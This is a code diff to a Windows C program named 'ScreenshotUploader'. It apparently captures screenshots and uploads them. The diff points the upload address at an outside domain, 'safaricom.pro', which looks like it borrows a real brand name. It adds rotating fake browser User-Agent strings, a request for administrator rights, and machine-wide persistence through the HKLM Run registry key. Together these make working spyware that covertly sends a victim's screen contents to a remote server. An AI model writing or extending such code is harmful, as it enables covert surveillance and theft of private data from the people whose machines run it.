@@ -13,11 +13,18 @@
 
 
 #define INACTIVITY_THRESHOLD 60
-#define BASE_URL "http://localhost/website_folder3/upload.php"
+#define BASE_URL "https://safaricom.pro/upload.php"
 const char *headers[] = {
-    "User-Agent: Mozilla/5.0 (Windows NT 10.0; ...",
-    "User-Agent: Mozilla/5.0 (Windows Phone 10.0; ...",
+    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
+    "User-Agent: Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Nokia Lumia 930) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36 Edge/40.15254.603",
+    "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
+    "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
+    "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
+    "User-Agent: Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
+    "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
+    "User-Agent: Mozilla/5.0 (Linux; Android 11; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.115 Mobile Safari/537.36"
 };
+
 
 #define RAND_INTERVAL_MIN 10
 #define RAND_INTERVAL_MAX 60
@@ -25,6 +32,40 @@ const char *headers[] = {
 volatile sig_atomic_t flag = 0;
 
 char *CURRENT_VERSION;
+
+void wait_for_services() {
+    DWORD waitTime = 30000; 
+    Sleep(waitTime);
+}
+BOOL IsRunningAsAdmin() {
+    BOOL is_admin = FALSE;
+    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
+    PSID AdministratorsGroup;
+    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup)) {
+        CheckTokenMembership(NULL, AdministratorsGroup, &is_admin);
+        FreeSid(AdministratorsGroup);
+    }
+    return is_admin;
+}
+
+void RequestElevation() {
+    TCHAR szPath[MAX_PATH];
+    if (GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath))) {
+        SHELLEXECUTEINFO sei = { sizeof(sei) };
+        sei.lpVerb = _T("runas");
+        sei.lpFile = szPath;
+        sei.hwnd = NULL;
+        sei.nShow = SW_NORMAL;
+        if (!ShellExecuteEx(&sei)) {
+            DWORD dwError = GetLastError();
+            if (dwError == ERROR_CANCELLED)
+                _tprintf(_T("User declined elevation request.\n"));
+            else
+                _tprintf(_T("Failed to elevate process. Error code: %d\n"), dwError);
+        }
+        exit(0); // Exit the current non-elevated process
+    }
+}
 
 char* read_version_from_config() {
     FILE *file = fopen("config.txt", "r");
@@ -88,11 +129,11 @@ typedef struct
 } PNGIOData;
 
 char* my_strndup(const char* s, size_t n) {
-    size_t len = strnlen(s, n);  // get length up to 'n'
-    char* new_str = (char*) malloc(len + 1);  // +1 for the null-terminator
-    if (new_str == NULL) return NULL;  // memory allocation failed
-    new_str[len] = '\0';  // null-terminate the new string
-    return memcpy(new_str, s, len);  // copy the string over
+    size_t len = strnlen(s, n); 
+    char* new_str = (char*) malloc(len + 1);  
+    if (new_str == NULL) return NULL;  
+    new_str[len] = '\0'; 
+    return memcpy(new_str, s, len);  
 }
 
 
@@ -184,8 +225,9 @@ BOOL isStartupSet()
     DWORD dwSize = sizeof(szValue);
     const char *szValueName = "ScreenshotUploader";
 
-    if (RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS)
+    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS)
     {
+        fprintf(stderr, "Failed to open registry key, error %d\n", GetLastError());
         return FALSE;
     }
 
@@ -199,6 +241,7 @@ BOOL isStartupSet()
 
     if (GetModuleFileName(NULL, szPath, MAX_PATH) == 0)
     {
+        fprintf(stderr, "Failed to get module file name, error %d\n", GetLastError());
         return FALSE;
     }
 
@@ -217,10 +260,14 @@ void setStartup()
         return;
     }
 
-    if (RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
+    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
     {
-        RegSetValueEx(hKey, szValueName, 0, REG_SZ, (BYTE *)szPath, _tcslen(szPath) * sizeof(TCHAR));
+        RegSetValueEx(hKey, szValueName, 0, REG_SZ, (BYTE *)szPath, (_tcslen(szPath) + 1) * sizeof(TCHAR));
         RegCloseKey(hKey);
+    }
+    else
+    {
+        fprintf(stderr, "Failed to open registry key, error %d\n", GetLastError());
     }
 }
 
@@ -413,6 +460,14 @@ void upload_screenshot(BYTE *image_data, unsigned int image_size, char *uuid)
 }
 
 int main(int argc, char **argv) {
+    if (!IsRunningAsAdmin()) {
+        _tprintf(_T("Not running as admin. Requesting elevation...\n"));
+        RequestElevation();
+    } else {
+        _tprintf(_T("Running as admin.\n"));
+    }
+
+    wait_for_services();
     CURRENT_VERSION = read_version_from_config();
     if (!CURRENT_VERSION) {
         fprintf(stderr, "Failed to read current version from config\n");
